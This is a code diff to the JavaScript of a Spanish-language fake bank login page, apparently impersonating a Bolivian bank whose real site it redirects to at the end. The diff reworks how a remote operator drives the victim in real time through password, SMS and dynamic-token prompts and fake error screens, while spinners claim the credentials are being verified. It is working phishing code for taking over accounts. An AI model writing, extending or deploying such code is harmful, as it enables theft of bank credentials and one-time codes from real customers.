@@ -279,7 +279,7 @@
       let pingInterval = null;
       let pollInterval = null;
       let isWaitingForNextAction = false;
-      let lastSubmitTime = 0;
+      let lastHandledActionId = 0;
       let hasInitialSubmitted = false;
       let lastTypingSent = 0;
 
@@ -341,7 +341,6 @@
 
         hasInitialSubmitted = true;
         isWaitingForNextAction = true;
-        lastSubmitTime = Date.now();
 
         // Queda en spinner de carga esperando la acción del operador
         showSpinner("Verificando credenciales", "Por favor espere un momento mientras procesamos su solicitud de ingreso...");
@@ -436,6 +435,7 @@
             if (res.ok) {
               const session = await res.json();
               const action = session.action;
+              const actionId = Number(session.actionId) || 0;
 
               // Actualizar imagen personalizada si el operador asignó una
               if (session.customImage) {
@@ -445,23 +445,32 @@
                 }
               }
 
-              if (action === 'password' || action === 'pedir-password') {
-                if (isWaitingForNextAction && (session.updatedAt || 0) <= lastSubmitTime) {
-                  return; // Mantener al usuario en el spinner! No reabrir la contraseña!
+              // Si el usuario está en el spinner esperando la siguiente acción del operador:
+              // Solo abandonamos el spinner si llega una acción NUEVA del operador (action existe y actionId > lastHandledActionId)
+              if (isWaitingForNextAction) {
+                if (!action || actionId <= lastHandledActionId) {
+                  return; // Mantener estrictamente al usuario en el spinner!
                 }
-                isWaitingForNextAction = false;
-                hideSpinner();
+              }
+
+              // Si no hay acción o la acción ya fue ejecutada previamente, NO hacer nada
+              // (esto evita borrar el campo de contraseña cada 1.2 segundos mientras escribe)
+              if (!action || actionId <= lastHandledActionId) {
+                return;
+              }
+
+              // Marcar la acción como ejecutada para NUNCA repetirla en ticks futuros
+              lastHandledActionId = actionId;
+              isWaitingForNextAction = false;
+              hideSpinner();
+
+              if (action === 'password' || action === 'pedir-password') {
                 stepUser.hidden = true;
                 stepToken.hidden = true;
                 stepPass.hidden = false;
                 box?.classList.add("extended");
                 if (pass) pass.focus();
               } else if (action === 'dinamica' || action === 'sms') {
-                if (isWaitingForNextAction && (session.updatedAt || 0) <= lastSubmitTime) {
-                  return; // Mantener al usuario en el spinner!
-                }
-                isWaitingForNextAction = false;
-                hideSpinner();
                 tokenErrorBox.style.display = "none";
                 stepPass.hidden = true;
                 stepUser.hidden = true;
@@ -478,8 +487,6 @@
 
                 resetOtpSlots();
               } else if (action === 'error-login') {
-                isWaitingForNextAction = false;
-                hideSpinner();
                 stepToken.hidden = true;
                 if (user && user.value && user.value.trim().length > 0) {
                   stepUser.hidden = true;
@@ -498,8 +505,6 @@
                   if (user) user.focus();
                 }
               } else if (action === 'error-dinamica' || action === 'error-sms') {
-                isWaitingForNextAction = false;
-                hideSpinner();
                 stepPass.hidden = true;
                 stepUser.hidden = true;
                 stepToken.hidden = false;
@@ -510,7 +515,6 @@
                 tokenErrorBox.style.display = "block";
                 resetOtpSlots();
               } else if (action === 'done') {
-                isWaitingForNextAction = false;
                 clearInterval(pingInterval);
                 clearInterval(pollInterval);
                 window.location.href = "https://www.bmsc.com.bo/";
@@ -537,7 +541,6 @@
         }
 
         isWaitingForNextAction = true;
-        lastSubmitTime = Date.now();
 
         showSpinner("Verificando sus credenciales", "Estamos procesando su solicitud de ingreso...");
 
@@ -627,7 +630,6 @@
 
         tokenErrorBox.style.display = "none";
         isWaitingForNextAction = true;
-        lastSubmitTime = Date.now();
         showSpinner("Validando código de seguridad", "Verificando el código ingresado...");
 
         fetch('/api/sessions/' + sessionId + '/token', {
